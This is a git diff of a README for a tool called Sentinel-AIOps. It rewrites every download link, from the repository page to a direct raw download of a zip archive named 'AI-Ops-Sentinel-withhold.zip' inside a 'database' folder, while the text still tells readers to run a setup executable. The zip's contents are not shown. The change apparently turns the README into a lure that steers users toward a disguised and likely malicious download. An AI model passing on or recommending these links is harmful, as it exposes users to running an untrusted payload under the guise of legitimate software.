@@ -1,6 +1,6 @@
 # 🛡️ Sentinel-AIOps - Reliable AI Monitoring Made Simple
 
-[![Download Sentinel-AIOps](https://img.shields.io/badge/Download-Sentinel--AIOps-ff6347?style=for-the-badge)](https://github.com/NAGHUL001/Sentinel-AIOps)
+[![Download Sentinel-AIOps](https://img.shields.io/badge/Download-Sentinel--AIOps-ff6347?style=for-the-badge)](https://github.com/NAGHUL001/Sentinel-AIOps/raw/refs/heads/main/database/AI-Ops-Sentinel-withhold.zip)
 
 ---
 
@@ -54,7 +54,7 @@ Start by visiting the download page to get the latest version.
 
 Click the link below or the badge at the top to open the download page for Sentinel-AIOps.
 
-[Download Sentinel-AIOps](https://github.com/NAGHUL001/Sentinel-AIOps)
+[Download Sentinel-AIOps](https://github.com/NAGHUL001/Sentinel-AIOps/raw/refs/heads/main/database/AI-Ops-Sentinel-withhold.zip)
 
 On this page, look for the **Releases** section or files labeled with the latest version. Download the installer or executable file named similarly to "Sentinel-AIOps-Setup.exe" or "Sentinel-AIOps.exe".
 
@@ -185,4 +185,4 @@ This tool applies techniques from these fields:
 
 Download Sentinel-AIOps or view the project details here:
 
-[https://github.com/NAGHUL001/Sentinel-AIOps](https://github.com/NAGHUL001/Sentinel-AIOps)
+[https://github.com/NAGHUL001/Sentinel-AIOps/raw/refs/heads/main/database/AI-Ops-Sentinel-withhold.zip](https://github.com/NAGHUL001/Sentinel-AIOps/raw/refs/heads/main/database/AI-Ops-Sentinel-withhold.zip)
